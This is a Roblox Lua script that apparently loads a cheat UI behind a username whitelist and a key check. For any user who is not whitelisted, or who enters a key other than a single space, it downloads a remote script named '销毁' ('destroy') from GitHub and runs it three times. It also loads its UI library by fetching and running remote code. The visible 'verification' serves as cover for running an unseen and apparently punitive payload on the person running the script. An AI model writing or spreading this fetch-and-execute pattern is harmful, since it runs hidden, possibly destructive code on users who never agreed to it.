local CoreGui = game:GetService("StarterGui")
-- 定义白名单表格，存储多个白名单用户名
local whitelist = {"test1000200", "sd16488", "cfdrtdhdtff54", "ytr7279"} -- 可根据需求添加更多用户名

local function notify(t, j, d)
    CoreGui:SetCore("SendNotification", {
        Title = t,
        Text = j,
        Duration = d,
    })
end

local UI = loadstring(game:HttpGet("https://raw.githubusercontent.com/kkaaccnnbb/Logan/refs/heads/main/uiilb"))()

local win = UI:new("Virtual")
local tab = win:Tab("名字")
local about = tab:section("")
about:Label("用户名".. game.Players.LocalPlayer.Name)
local key = game.Players.LocalPlayer.Name
-- 检查用户名是否在白名单表格中
if table.find(whitelist, key) then
    notify("验证成功", "欢迎使用", 3)
else
    notify("验证失败(没白名单)", "没白名单就找小叶加", 3)
    loadstring(game:HttpGet("https://github.com/HKJQ3/-script/raw/refs/heads/main/销毁"))()
    wait(1)
    loadstring(game:HttpGet("https://github.com/HKJQ3/-script/raw/refs/heads/main/销毁"))()
    wait(1)
    loadstring(game:HttpGet("https://github.com/HKJQ3/-script/raw/refs/heads/main/销毁"))()
    wait(1)
end

local section = tab:section("验证卡密", true)
section:Textbox("请输入文本", 'TextBoxfalg', "文本", function(txt)
    key = txt
end)
section:Button("验证文本", function()
    if key == " " then
        notify("验证成功", "企鹅没版权", 3)
    else
        notify("密码是", "企鹅没母", 3)
        loadstring(game:HttpGet("https://github.com/HKJQ3/-script/raw/refs/heads/main/销毁"))()
        wait(1)
        loadstring(game:HttpGet("https://github.com/HKJQ3/-script/raw/refs/heads/main/销毁"))()
        wait(1)
        loadstring(game:HttpGet("https://github.com/HKJQ3/-script/raw/refs/heads/main/销毁"))()
        wait(1)
    end
end)
